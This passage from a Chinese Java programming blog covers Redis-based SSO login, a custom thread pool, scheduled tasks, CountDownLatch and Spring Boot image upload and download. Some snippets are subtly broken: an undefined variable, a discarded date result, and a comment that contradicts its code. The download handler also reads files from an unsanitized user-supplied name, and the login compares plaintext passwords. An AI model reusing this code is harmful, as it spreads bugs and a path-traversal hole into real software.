    <span class="hljs-keyword">if</span>(cookie != <span class="hljs-literal">null</span>)&#123;
        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> cookie.getValue();
        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> redisUtils.get(token); <span class="hljs-comment">// 从redis中根据token获取用户信息</span>
        System.out.println(username);
        <span class="hljs-comment">// User user = LogCacheUtil.loginUser.get(token);</span>
        <span class="hljs-keyword">if</span>(user != <span class="hljs-literal">null</span>)&#123;
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:&quot;</span> + target;
        &#125;
    &#125;
    session.setAttribute(<span class="hljs-string">&quot;target&quot;</span>,target);
    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;
&#125;</code></pre>

<p>在用户登录时，以&lt;token, username&gt;为键值对保存信息。</p>
<pre><code class="hljs java"><span class="hljs-meta">@PostMapping</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">doLogin</span><span class="hljs-params">(User user, HttpSession session, HttpServletResponse response)</span> &#123;
        <span class="hljs-type">String</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> (String) session.getAttribute(<span class="hljs-string">&quot;target&quot;</span>);
        Optional&lt;User&gt; first = dbUser.stream().filter(dbUser -&gt; dbUser.getUsername().equals(user.getUsername()) &amp;&amp;
                dbUser.getPassword().equals(user.getPassword()))
                .findFirst();
        <span class="hljs-keyword">if</span> (first.isPresent()) &#123;
            <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString();
            <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;TOKEN&quot;</span>, token);
            cookie.setPath(<span class="hljs-string">&quot;/&quot;</span>);
            cookie.setDomain(<span class="hljs-string">&quot;codeshop.com&quot;</span>);
            response.addCookie(cookie);
            <span class="hljs-comment">// 向redis中存token</span>
            redisUtils.set(token, first.get().getUsername());
<span class="hljs-comment">//            LogCacheUtil.loginUser.put(token, first.get());</span>
        &#125; <span class="hljs-keyword">else</span> &#123;
            session.setAttribute(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;用户名或密码错误!&quot;</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>;
        &#125;
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:&quot;</span> + target;
    &#125;

    <span class="hljs-meta">@GetMapping(&quot;info&quot;)</span>
    <span class="hljs-meta">@ResponseBody</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;String&gt; <span class="hljs-title function_">getUserInfo</span><span class="hljs-params">(String token)</span> &#123;
        <span class="hljs-keyword">if</span> (!StringUtils.isEmpty(token)) &#123;
            <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> redisUtils.get(token);
<span class="hljs-comment">//            User user = LogCacheUtil.loginUser.get(token);</span>
            <span class="hljs-keyword">return</span> ResponseEntity.ok(username);
        &#125; <span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>&lt;&gt;(<span class="hljs-literal">null</span>, HttpStatus.BAD_REQUEST);
        &#125;
    &#125;</code></pre>

<p>在main, vip, cart模块也要修改获取用户信息的代码</p>
<pre><code class="hljs java"><span class="hljs-meta">@Autowired</span>
   <span class="hljs-keyword">private</span> RedisUtils redisUtils;
   <span class="hljs-meta">@Autowired</span>
   <span class="hljs-keyword">private</span> RestTemplate restTemplate;

   <span class="hljs-comment">//private final String USER_INFO_ADDRESS = &quot;http://login.codeshop.com:9000/login/info?token=&quot;;</span>

   <span class="hljs-meta">@GetMapping(&quot;/index&quot;)</span>
   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toIndex</span><span class="hljs-params">(<span class="hljs-meta">@CookieValue(required = false, value = &quot;TOKEN&quot;)</span>Cookie cookie,</span>
<span class="hljs-params">                         HttpSession session)</span>&#123;
       <span class="hljs-keyword">if</span>(cookie != <span class="hljs-literal">null</span>)&#123;
           <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> cookie.getValue();
           <span class="hljs-keyword">if</span>(!StringUtils.isEmpty(token))&#123;
               <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> redisUtils.get(token); <span class="hljs-comment">// 直接从redis中获取，省去http调用带来的的延时</span>
               session.setAttribute(<span class="hljs-string">&quot;loginUser&quot;</span>,result);
           &#125;
       &#125;
       <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;
   &#125;</code></pre>

<p>源码：<a href="https://github.com/sunzhengyu99/SSO-demo">https://github.com/sunzhengyu99/SSO-demo</a></p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>SSO</tag>
      </tags>
  </entry>
  <entry>
    <title>test</title>
    <url>/2023/08/20/test/</url>
    <content><![CDATA[<h1 id="test"><a href="#test" class="headerlink" title="test"></a>test</h1><p>这是macOS</p>
]]></content>
  </entry>
  <entry>
    <title>juc</title>
    <url>/2023/01/24/thread-pool/</url>
    <content><![CDATA[<h1 id="线程池demo"><a href="#线程池demo" class="headerlink" title="线程池demo"></a>线程池demo</h1><p>简化版java线程池</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.test;

<span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;

<span class="hljs-keyword">import</span> java.util.ArrayDeque;
<span class="hljs-keyword">import</span> java.util.Deque;
<span class="hljs-keyword">import</span> java.util.HashSet;
<span class="hljs-keyword">import</span> java.util.concurrent.TimeUnit;
<span class="hljs-keyword">import</span> java.util.concurrent.locks.Condition;
<span class="hljs-keyword">import</span> java.util.concurrent.locks.ReentrantLock;

<span class="hljs-meta">@Slf4j(topic = &quot;c.ThredPoolDemo&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThredPoolDemo</span> &#123;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;
        <span class="hljs-type">ThreadPool</span> <span class="hljs-variable">threadPool</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPool</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>, TimeUnit.MILLISECONDS, <span class="hljs-number">1</span>, ((queue, task) -&gt; &#123;
            <span class="hljs-comment">// 1.死等</span>
<span class="hljs-comment">//            queue.put(task);</span>
            <span class="hljs-comment">// 2.带超时时间的等待</span>
            queue.offer(task, <span class="hljs-number">1500</span>, TimeUnit.MILLISECONDS);
            <span class="hljs-comment">// 3.放弃任务执行</span>
<span class="hljs-comment">//            log.debug(&quot;放弃任务&#123;&#125;&quot;, task);</span>
            <span class="hljs-comment">// 4.抛出异常</span>
<span class="hljs-comment">//            throw new RuntimeException(&quot;任务执行失败 &quot; + task);</span>
            <span class="hljs-comment">// 5.让调用者自己执行任务</span>
<span class="hljs-comment">//            task.run();  // 在主线程中执行任务</span>
        &#125;));
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;
            <span class="hljs-type">int</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> i;
            threadPool.execute(()-&gt;&#123;
                <span class="hljs-keyword">try</span> &#123;
                    Thread.sleep(<span class="hljs-number">2000</span>);
                &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;
                    e.printStackTrace();
                &#125;
                log.debug(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, id);
            &#125;);
        &#125;
    &#125;
&#125;

<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 将执行策略下放给调用者决定</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> &lt;T&gt;</span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@FunctionalInterface</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">RejectPolicy</span>&lt;T&gt;&#123;
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">reject</span><span class="hljs-params">(BlockingQueue&lt;T&gt; queue, T task)</span>;
&#125;

<span class="hljs-meta">@Slf4j(topic = &quot;c.ThreadPool&quot;)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadPool</span> &#123;
    <span class="hljs-comment">// 任务队列</span>
    <span class="hljs-keyword">private</span> BlockingQueue&lt;Runnable&gt; taskQueue;

    <span class="hljs-comment">// 线程集合</span>
    <span class="hljs-keyword">private</span> HashSet&lt;Worker&gt; workers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>();

    <span class="hljs-comment">// 核心线程数</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> coreSize;

    <span class="hljs-comment">// 超时时间</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> timeout;

    <span class="hljs-comment">// 时间单位</span>
    <span class="hljs-keyword">private</span> TimeUnit timeUnit;

    <span class="hljs-comment">// 拒绝策略</span>
    <span class="hljs-keyword">private</span> RejectPolicy&lt;Runnable&gt; rejectPolicy;

    <span class="hljs-comment">//执行任务</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(Runnable task)</span>&#123;
        <span class="hljs-keyword">synchronized</span> (workers)&#123;
            <span class="hljs-comment">// 当任务线程数没有超过核心线程数 直接交个worker对象执行</span>
            <span class="hljs-keyword">if</span>(workers.size() &lt; coreSize)&#123;
                <span class="hljs-type">Worker</span> <span class="hljs-variable">worker</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Worker</span>(task);
                log.debug(<span class="hljs-string">&quot;worker被创建&#123;&#125;, task is &#123;&#125;&quot;</span>, worker,task);
                workers.add(worker);
                <span class="hljs-comment">// 执行任务</span>
                worker.start();
            &#125; <span class="hljs-keyword">else</span> &#123;
                <span class="hljs-comment">// 如果任务数超过coreSize 则加入任务队列暂存</span>
<span class="hljs-comment">//                taskQueue.put(task);</span>
                taskQueue.tryPut(rejectPolicy,task);
            &#125;
        &#125;
    &#125;

	<span class="hljs-comment">// 构造函数</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ThreadPool</span><span class="hljs-params">(<span class="hljs-type">int</span> coreSize, <span class="hljs-type">long</span> timeout, TimeUnit timeUnit,<span class="hljs-type">int</span> queueCapatiy, RejectPolicy&lt;Runnable&gt; rejectPolicy)</span> &#123;
        <span class="hljs-built_in">this</span>.coreSize = coreSize;
        <span class="hljs-built_in">this</span>.timeout = timeout;
        <span class="hljs-built_in">this</span>.timeUnit = timeUnit;
        <span class="hljs-built_in">this</span>.taskQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BlockingQueue</span>&lt;&gt;(queueCapatiy);
        <span class="hljs-built_in">this</span>.rejectPolicy = rejectPolicy;
    &#125;
	<span class="hljs-comment">// 任务处理对象</span>
    <span class="hljs-keyword">class</span> <span class="hljs-title class_">Worker</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span>&#123;
        <span class="hljs-keyword">private</span> Runnable task;
        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Worker</span><span class="hljs-params">(Runnable task)</span> &#123;
            <span class="hljs-built_in">this</span>.task = task;
        &#125;

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;
            <span class="hljs-comment">// 1.当task不为空时，直接执行任务</span>
            <span class="hljs-comment">// 2.当task为空时，需要到任务队列中拉去任务执行</span>
<span class="hljs-comment">//            while(task != null || (task = taskQueue.take()) != null)&#123;</span>
            <span class="hljs-keyword">while</span>(task != <span class="hljs-literal">null</span> || (task = taskQueue.poll(timeout, timeUnit)) != <span class="hljs-literal">null</span>)&#123;
                <span class="hljs-keyword">try</span>&#123;
                    log.debug(<span class="hljs-string">&quot;task正在被执行...&#123;&#125;&quot;</span>, task);
                    task.run();
                &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;

                &#125;<span class="hljs-keyword">finally</span> &#123;
                    task = <span class="hljs-literal">null</span>;
                &#125;
            &#125;
            <span class="hljs-comment">// 退出循环说明任务执行完毕 需要从worker中移除</span>
            <span class="hljs-keyword">synchronized</span> (workers)&#123;
                log.debug(<span class="hljs-string">&quot;worker 被移除&#123;&#125;&quot;</span>, <span class="hljs-built_in">this</span>);
                workers.remove(<span class="hljs-built_in">this</span>);
            &#125;
        &#125;
    &#125;
&#125;
<span class="hljs-meta">@Slf4j(topic = &quot;c.BlockingQueue&quot;)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">BlockingQueue</span>&lt;T&gt; &#123;
    <span class="hljs-comment">// 1.任务队列</span>
    <span class="hljs-keyword">private</span> Deque&lt;T&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayDeque</span>&lt;&gt;();
    <span class="hljs-comment">// 2.锁</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-comment">// 3.生产者条件变量</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">Condition</span> <span class="hljs-variable">fullWaitSet</span> <span class="hljs-operator">=</span> lock.newCondition();
    <span class="hljs-comment">// 4.消费者条件变量</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">Condition</span> <span class="hljs-variable">emptyWaitSet</span> <span class="hljs-operator">=</span> lock.newCondition();
    <span class="hljs-comment">// 5.线程池的最大容量</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> capacity;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BlockingQueue</span><span class="hljs-params">(<span class="hljs-type">int</span> capacity)</span> &#123;
        <span class="hljs-built_in">this</span>.capacity = capacity;
    &#125;

    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">poll</span><span class="hljs-params">(<span class="hljs-type">long</span> timeout, TimeUnit unit)</span> &#123;
        lock.lock();
        <span class="hljs-keyword">try</span> &#123;
            <span class="hljs-comment">// 将timeout统一转换为纳秒</span>
            <span class="hljs-type">long</span> <span class="hljs-variable">nanos</span> <span class="hljs-operator">=</span> unit.toNanos(timeout);
            <span class="hljs-keyword">while</span> (queue.isEmpty()) &#123;
                <span class="hljs-keyword">try</span> &#123;
                    <span class="hljs-keyword">if</span> (nanos &lt;= <span class="hljs-number">0</span>) &#123;
                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
                    &#125;
                    <span class="hljs-comment">// 返回的是剩余的等待时间</span>
                    nanos = emptyWaitSet.awaitNanos(nanos);
                &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;
                    e.printStackTrace();
                &#125;
            &#125;
            <span class="hljs-type">T</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> queue.removeFirst();
            fullWaitSet.signal();
            <span class="hljs-keyword">return</span> t;
        &#125; <span class="hljs-keyword">finally</span> &#123;
            lock.unlock();
        &#125;
    &#125;


    <span class="hljs-comment">// 阻塞获取</span>
    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">take</span><span class="hljs-params">()</span> &#123;
        lock.lock();
        <span class="hljs-keyword">try</span> &#123;
            <span class="hljs-keyword">while</span> (queue.isEmpty()) &#123;
                <span class="hljs-keyword">try</span> &#123;
                    emptyWaitSet.await();
                &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;
                    e.printStackTrace();
                &#125;
            &#125;
            <span class="hljs-type">T</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> queue.removeFirst();
            fullWaitSet.signal();
            <span class="hljs-keyword">return</span> t;
        &#125; <span class="hljs-keyword">finally</span> &#123;
            lock.unlock();
        &#125;
    &#125;


    <span class="hljs-comment">// 带超时时间的阻塞添加</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">offer</span><span class="hljs-params">(T task, <span class="hljs-type">long</span> timeout, TimeUnit timeUnit)</span>&#123;
        lock.lock();
        <span class="hljs-keyword">try</span> &#123;
            <span class="hljs-type">long</span> <span class="hljs-variable">nanos</span> <span class="hljs-operator">=</span> timeUnit.toNanos(timeout);
                <span class="hljs-keyword">while</span> (queue.size() == capacity) &#123;
                <span class="hljs-keyword">try</span> &#123;
                    <span class="hljs-keyword">if</span>(nanos &lt;= <span class="hljs-number">0</span>)&#123;
                        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
                    &#125;
                    log.debug(<span class="hljs-string">&quot;等待加入任务队列&#123;&#125;&quot;</span>, task);
                    nanos = fullWaitSet.awaitNanos(nanos);
                &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;
                    e.printStackTrace();
                &#125;
            &#125;
            log.debug(<span class="hljs-string">&quot;加入任务队列&#123;&#125;&quot;</span>, task);
            queue.addLast(task);
            emptyWaitSet.signal();
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        &#125; <span class="hljs-keyword">finally</span> &#123;
            lock.unlock();
        &#125;
    &#125;

    <span class="hljs-comment">//阻塞添加</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">put</span><span class="hljs-params">(T task)</span> &#123;
        lock.lock();
        <span class="hljs-keyword">try</span> &#123;
            <span class="hljs-keyword">while</span> (queue.size() == capacity) &#123;
                <span class="hljs-keyword">try</span> &#123;
                    log.debug(<span class="hljs-string">&quot;等待加入任务队列&#123;&#125;&quot;</span>, task);
                    fullWaitSet.await();
                &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;
                    e.printStackTrace();
                &#125;
            &#125;
            log.debug(<span class="hljs-string">&quot;加入任务队列&#123;&#125;&quot;</span>, task);
            queue.addLast(task);
            emptyWaitSet.signal();
        &#125; <span class="hljs-keyword">finally</span> &#123;
            lock.unlock();
        &#125;
    &#125;

    <span class="hljs-comment">// 有拒绝策略的添加</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">tryPut</span><span class="hljs-params">(RejectPolicy&lt;T&gt; rejectPolicy, T task)</span> &#123;
        lock.lock();
        <span class="hljs-keyword">try</span> &#123;
            <span class="hljs-comment">// 判断队列是否满</span>
            <span class="hljs-keyword">if</span>(queue.size() == capacity) &#123;
                rejectPolicy.reject(<span class="hljs-built_in">this</span>, task);
            &#125; <span class="hljs-keyword">else</span> &#123;  <span class="hljs-comment">// 有空闲</span>
                log.debug(<span class="hljs-string">&quot;加入任务队列 &#123;&#125;&quot;</span>, task);
                queue.addLast(task);
                emptyWaitSet.signal();
            &#125;
        &#125; <span class="hljs-keyword">finally</span> &#123;
            lock.unlock();
        &#125;
    &#125;

    <span class="hljs-comment">// 获取大小</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getSize</span><span class="hljs-params">()</span> &#123;
        lock.lock();
        <span class="hljs-keyword">try</span> &#123;
            <span class="hljs-keyword">return</span> queue.size();
        &#125; <span class="hljs-keyword">finally</span> &#123;
            lock.unlock();
        &#125;
    &#125;
&#125;
</code></pre>



<h1 id="定时任务demo"><a href="#定时任务demo" class="headerlink" title="定时任务demo"></a>定时任务demo</h1><p>能够在固定时间执行任务</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.n8;


<span class="hljs-keyword">import</span> java.time.DayOfWeek;
<span class="hljs-keyword">import</span> java.time.Duration;
<span class="hljs-keyword">import</span> java.time.LocalDateTime;
<span class="hljs-keyword">import</span> java.util.concurrent.Executors;
<span class="hljs-keyword">import</span> java.util.concurrent.ScheduledExecutorService;
<span class="hljs-keyword">import</span> java.util.concurrent.TimeUnit;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScheduleDemo</span> &#123;


    <span class="hljs-comment">// 如何实现在 固定时间点执行任务</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;
        <span class="hljs-comment">// 当前时间</span>
        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">nowTime</span> <span class="hljs-operator">=</span> LocalDateTime.now();

        <span class="hljs-comment">// 周四的时间</span>
        <span class="hljs-type">LocalDateTime</span> <span class="hljs-variable">time</span> <span class="hljs-operator">=</span>  nowTime.withHour(<span class="hljs-number">22</span>).withMinute(<span class="hljs-number">12</span>).withSecond(<span class="hljs-number">0</span>).withNano(<span class="hljs-number">0</span>).with(DayOfWeek.SUNDAY);
        <span class="hljs-comment">// 当前时间与周四的时间差值</span>
        <span class="hljs-type">long</span> initDaley;
        <span class="hljs-comment">// 一周的时间</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">period</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span> * <span class="hljs-number">3600</span> * <span class="hljs-number">24</span> * <span class="hljs-number">7</span>;

        <span class="hljs-keyword">if</span>(nowTime.compareTo(time) &gt; <span class="hljs-number">0</span> )&#123;
            time.plusWeeks(<span class="hljs-number">1</span>);
        &#125;

        System.out.println(nowTime);
        System.out.println(time);
        initDaley = Duration.between(nowTime, time).toMillis();
        <span class="hljs-type">ScheduledExecutorService</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> Executors.newScheduledThreadPool(<span class="hljs-number">1</span>);

        pool.scheduleAtFixedRate(()-&gt;&#123;
            System.out.println(<span class="hljs-string">&quot;running...&quot;</span>);
        &#125;, initDaley, period, TimeUnit.MILLISECONDS);
    &#125;
&#125;
</code></pre>





<h1 id="CountDownLatch-应用例子"><a href="#CountDownLatch-应用例子" class="headerlink" title="CountDownLatch 应用例子"></a>CountDownLatch 应用例子</h1><p>模拟游戏开始之前用户的加载过程</p>
<pre><code class="hljs java"><span class="hljs-meta">@Slf4j(topic = &quot;c.CountDownLatchDemo&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CountDownLatchDemo</span> &#123;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;
        <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">10</span>);
        <span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">latch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(<span class="hljs-number">10</span>);
        <span class="hljs-type">Random</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();
        String[] allUsers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">10</span>];
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;
            <span class="hljs-type">int</span> <span class="hljs-variable">k</span> <span class="hljs-operator">=</span> i;
            service.submit(() -&gt; &#123;
                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">100</span>; j++) &#123;
                    <span class="hljs-keyword">try</span> &#123;
                        Thread.sleep(random.nextInt(<span class="hljs-number">100</span>));
                    &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;
                        e.printStackTrace();
                    &#125;
                    allUsers[k] = j + <span class="hljs-string">&quot;%&quot;</span>;
                    System.out.print(<span class="hljs-string">&quot;\r&quot;</span> + Arrays.toString(allUsers));
                &#125;
                latch.countDown();
            &#125;);
        &#125;

        <span class="hljs-keyword">try</span> &#123;
            latch.await();
            System.out.println(<span class="hljs-string">&quot;\r&quot;</span> + Arrays.toString(allUsers));
            log.debug(<span class="hljs-string">&quot;游戏开始...&quot;</span>);
        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;
            e.printStackTrace();
        &#125;
        service.shutdown();
    &#125;
&#125;
</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20230511224925989.png" alt="image-20230511224925989"></p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>juc</tag>
      </tags>
  </entry>
  <entry>
    <title>springboot工具类</title>
    <url>/2022/04/29/springbooot-upload-file/</url>
    <content><![CDATA[<h1 id="javaweb中图片文件上传和下载"><a href="#javaweb中图片文件上传和下载" class="headerlink" title="javaweb中图片文件上传和下载"></a>javaweb中图片文件上传和下载</h1><p>使用springboot创建web项目</p>
<p>服务端要接收客户端页面上传的文件，通常都会使用Apache的两个组件:</p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">commons-fileupload</span>
<span class="hljs-attribute">commons-io</span></code></pre>

<p>Spring框架在spring-web包中对文件上传进行了封装，大大简化了服务端代码，实现步骤如下：</p>
<h2 id="1-创建Controller"><a href="#1-创建Controller" class="headerlink" title="1.创建Controller"></a>1.创建Controller</h2><p>因为图片上传是一个公共接口所以可以创建一个名为<code>CommonController</code>的文件，url地址为<code>/common</code></p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 主要用于文件上传和下载</span>
<span class="hljs-comment"> */</span>

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping(&quot;/common&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonController</span> &#123;
	<span class="hljs-meta">@Value(&quot;$&#123;reggie.path&#125;&quot;)</span> <span class="hljs-comment">// 保存图片的路径</span>
    <span class="hljs-keyword">private</span> String basePath;
&#125;</code></pre>

<h3 id="上传图片"><a href="#上传图片" class="headerlink" title="上传图片"></a>上传图片</h3><pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 文件上传</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> file</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@PostMapping(&quot;/upload&quot;)</span>
<span class="hljs-keyword">public</span> R&lt;String&gt; <span class="hljs-title function_">upload</span><span class="hljs-params">(MultipartFile file)</span>&#123;
    <span class="hljs-comment">// file是一个临时文件，后续需要进行转存</span>
    <span class="hljs-comment">// file需要与前端上传的参数名保持一致，否则无法获取到上传的文件</span>
    <span class="hljs-comment">// 转存之前需要对文件名进行处理</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">originalFilename</span> <span class="hljs-operator">=</span> file.getOriginalFilename();
    <span class="hljs-type">String</span> <span class="hljs-variable">suffix</span> <span class="hljs-operator">=</span> originalFilename.substring(originalFilename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>));

    <span class="hljs-comment">// 防止文件被覆盖，使用uuid作为文件名</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString();
    filename = filename + suffix;

    <span class="hljs-type">File</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(basePath); <span class="hljs-comment">// 判断文件夹是否存在不存在则创建</span>
    <span class="hljs-keyword">if</span> (!dir.exists())&#123;
        dir.mkdir();
    &#125;
    <span class="hljs-comment">// 将图片保存的指定位置</span>
    <span class="hljs-keyword">try</span> &#123;
        file.transferTo(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(basePath + filename));
    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;
        e.printStackTrace();
    &#125;
    <span class="hljs-keyword">return</span> R.success(filename);
&#125;</code></pre>



<h3 id="下载图片"><a href="#下载图片" class="headerlink" title="下载图片"></a>下载图片</h3><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/download&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">download</span><span class="hljs-params">(String name, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;
    <span class="hljs-comment">// 文件输入流读取本地文件</span>
    <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
    <span class="hljs-comment">// 使用响应输出流将图片显示在网页上</span>
    <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;

    <span class="hljs-keyword">try</span> &#123;
        fileInputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(basePath + name));
        outputStream = response.getOutputStream();
        response.setContentType(<span class="hljs-string">&quot;image/jpeg&quot;</span>);
        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];
